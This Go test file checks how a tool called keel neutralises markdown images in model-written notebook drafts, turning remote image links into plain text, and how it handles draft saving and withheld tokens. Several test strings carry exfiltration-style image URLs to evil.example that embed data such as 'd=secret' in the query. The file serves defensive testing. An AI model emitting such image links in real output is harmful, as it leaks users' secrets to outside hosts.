package service

import (
	"context"
	"errors"
	"strings"
	"testing"

	"keel/internal/store"
)

// Review fixes for notebooks and the agent (§18).

// A remote image in a draft would be fetched by the webview when the draft
// opens, with whatever the model put in its URL: every image but a data:
// one becomes text. Code is left as written.
func TestDefuseImages(t *testing.T) {
	cases := map[string]string{
		"see ![chart](https://evil.example/?d=secret) here":                                 "see chart `https://evil.example/?d=secret` here",
		"![](http://x.example/a.png)":                                                       "`http://x.example/a.png`",
		`![t](https://x.example/a.png "title")`:                                             "t `https://x.example/a.png`",
		"![ok](data:image/png;base64,AAAA)":                                                 "![ok](data:image/png;base64,AAAA)",
		"![ref][logo]\n\n[logo]: https://evil.example/l.png":                                "!\\[ref][logo]\n\n[logo]: https://evil.example/l.png",
		"[![badge](https://evil.example/b.svg)](https://example.com)":                       "[badge `https://evil.example/b.svg`](https://example.com)",
		"`![in code](https://x.example/c.png)` and \\![escaped](u)":                         "`![in code](https://x.example/c.png)` and \\![escaped](u)",
		"```md\n![fenced](https://x.example/f.png)\n```\n![after](https://x.example/g.png)": "```md\n![fenced](https://x.example/f.png)\n```\nafter `https://x.example/g.png`",
	}
	for in, want := range cases {
		if got := defuseImages(in); got != want {
			t.Errorf("defuseImages(%q)\n got %q\nwant %q", in, got, want)
		}
	}
	// Whatever the input, no inline image with a remote URL is left
	// outside code.
	for _, in := range []string{"![a![b](https://x.example/n.png)", "![x](<https://x.example/a b.png>)", "!![x](https://x.example/y.png)"} {
		out := defuseImages(in)
		if strings.Contains(out, "](https://") && strings.Contains(out, "![") && !strings.Contains(out, `!\[`) {
			t.Errorf("defuseImages(%q) = %q still holds an image", in, out)
		}
	}
}

func TestNotebookDraftImagesBecomeText(t *testing.T) {
	f := newNbFixture(t, "```keel-notebook\n{\"title\": \"T\", \"body\": \"Done.\\n\\n![chart](https://evil.example/leak.png?d=abc)\\n\\n```sh\\necho '![x](https://y.example/z.png)'\\n```\"}\n```")
	resp, err := f.svc.Ask(context.Background(), AskRequest{ConversationID: conv, Question: "write this up"})
	if err != nil {
		t.Fatal(err)
	}
	b := resp.Notebooks[0].Body
	if strings.Contains(b, "![chart]") || !strings.Contains(b, "chart `https://evil.example/leak.png?d=abc`") || !strings.Contains(b, "echo '![x](https://y.example/z.png)'") {
		t.Fatalf("body = %q", b)
	}
}

// Every draft of a proposal goes with the first save, also when keel serve
// no longer holds the proposal (its conversation was evicted or deleted).
func TestNotebookSiblingDraftsGoWithTheFirstSave(t *testing.T) {
	f := newNbFixture(t, draftReply)
	resp, err := f.svc.Ask(context.Background(), AskRequest{ConversationID: conv, Question: "write this up"})
	if err != nil {
		t.Fatal(err)
	}
	id := resp.Notebooks[0].ID
	a, err := f.svc.OpenNotebookDraft(conv, id)
	if err != nil {
		t.Fatal(err)
	}
	b, err := f.svc.OpenNotebookDraft(conv, id)
	if err != nil {
		t.Fatal(err)
	}
	f.svc.mu.Lock()
	delete(f.svc.convs, conv)
	f.svc.mu.Unlock()
	if _, err := f.svc.SaveNotebookDraft(a.DraftID, NotebookSaveRequest{Name: "x", Cells: []store.NotebookCell{{Body: "y"}}}); err != nil {
		t.Fatal(err)
	}
	if _, err := f.svc.SaveNotebookDraft(b.DraftID, NotebookSaveRequest{Name: "x", Cells: []store.NotebookCell{{Body: "y"}}}); !errors.Is(err, ErrNoDraft) {
		t.Fatalf("sibling draft after the proposal left memory → %v, want ErrNoDraft", err)
	}
	if len(f.nbs.added) != 1 {
		t.Fatalf("%d notebooks saved, want 1", len(f.nbs.added))
	}
}

// A draft naming a value Keel withheld ({{name}}) says so.
func TestNotebookDraftWithheldFlag(t *testing.T) {
	f := newNbFixture(t, "```keel-notebook\n{\"title\": \"T\", \"body\": \"kubeadm join --token "+nbCaptured+"\"}\n```")
	resp, err := f.svc.Ask(context.Background(), AskRequest{ConversationID: conv, Question: "write this up"})
	if err != nil {
		t.Fatal(err)
	}
	p := resp.Notebooks[0]
	if !p.Withheld || !strings.Contains(p.Body, "{{join_token}}") || strings.Contains(p.Body, nbCaptured) {
		t.Fatalf("proposal = %+v", p)
	}
	d, err := f.svc.OpenNotebookDraft(conv, p.ID)
	if err != nil || !d.Withheld {
		t.Fatalf("draft = %+v %v", d, err)
	}
}
